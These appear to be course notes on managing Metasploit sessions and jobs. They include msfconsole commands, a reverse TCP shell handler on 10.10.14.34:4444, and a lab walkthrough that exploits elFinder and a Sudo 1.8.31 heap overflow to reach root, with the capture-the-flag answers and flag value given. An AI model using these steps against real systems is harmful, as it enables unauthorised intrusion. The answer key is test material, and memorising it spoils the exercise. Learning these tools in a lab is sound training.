MSFconsole can manage multiple modules at the same time. This is one of the many reasons it provides the user with so much flexibility. This is done with the use of `Sessions`, which creates dedicated control interfaces for all of your deployed modules.
Once several sessions are created, we can switch between them and link a different module to one of the backgrounded sessions to run on it or turn them into jobs.

## Using Sessions
While running any available exploits or auxiliary modules in msfconsole, we can background the session as long as they form a channel of communication with the target host. This can be done either by pressing the `[CTRL] + [Z]` key combination or by typing the `background` command in the case of Meterpreter stages.

#### Listing Active Sessions
```shell-session
msf6 exploit(windows/smb/psexec_psh) > sessions

1    meterpreter x86/windows ...
```

#### Interacting with a Session
You can use the `sessions -i [no.]` command to open up a specific session.
```shell-session
msf6 exploit(windows/smb/psexec_psh) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > 
```

This is specifically useful when we want to run an additional module on an already exploited system with a formed, stable communication channel.
This can be done by backgrounding our current session, which is formed due to the success of the first exploit, searching for the second module we wish to run, and, if made possible by the type of module selected, selecting the session number on which the module should be run. This can be done from the second module's `show options` menu.

Usually, these modules can be found in the `post` category, referring to Post-Exploitation modules. The main archetypes of modules in this category consist of credential gatherers, local exploit suggesters, and internal network scanners.

## Jobs
If, for example, we are running an active exploit under a specific port and need this port for a different module, we cannot simply terminate the session using `[CTRL] + [C]`. If we did that, we would see that the port would still be in use, affecting our use of the new module. So instead, we would need to use the `jobs` command to look at the currently active tasks running in the background and terminate the old ones to free up the port

#### Viewing the Jobs Command Help Menu
```shell
msf6 exploit(multi/handler) > jobs -h
```

#### Viewing the Exploit Command Help Menu
When we run an exploit, we can run it as a job by typing `exploit -j`. Per the help menu for the `exploit` command, adding `-j` to our command. Instead of just `exploit` or `run`, will "run it in the context of a job."
```shell-session
msf6 exploit(multi/handler) > exploit -h
```
#### Running an Exploit as a Background Job
```shell-session
msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.14.34:4444
```

#### Listing Running Jobs
To list all running jobs, we can use the `jobs -l` command. To kill a specific job, look at the index no. of the job and use the `kill [index no.]` command. Use the `jobs -K` command to kill all running jobs.

```shell-session
msf6 exploit(multi/handler) > jobs -l

Jobs
====

 Id  Name                    Payload                    Payload opts
 --  ----                    -------                    ------------
 0   Exploit: multi/handler  generic/shell_reverse_tcp  tcp://10.10.14.34:4444
```


### Questions

1.  The target has a specific web application running that we can find by looking into the HTML source code. What is the name of that web application?

2.  Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with?

3.  The target system has an old version of Sudo running. Find the relevant exploit and get root access to the target system. Find the flag.txt file and submit the contents of it as the answer.

```shell
We can simply curl the ip to get the first answer:
Answer 1: elFinder

Get meterpreter by exploiting elFinder.

Sudo version is vulnerable to heap buffer overflow, exploit this with metasploit. Backrgound meterpreter and exploit session 1.
sudo --version
Sudo version 1.8.31

We now have 2 sessions 1 as www-data and one as root.

flag.txt: HTB{5e55ion5_4r3_sw33t}
```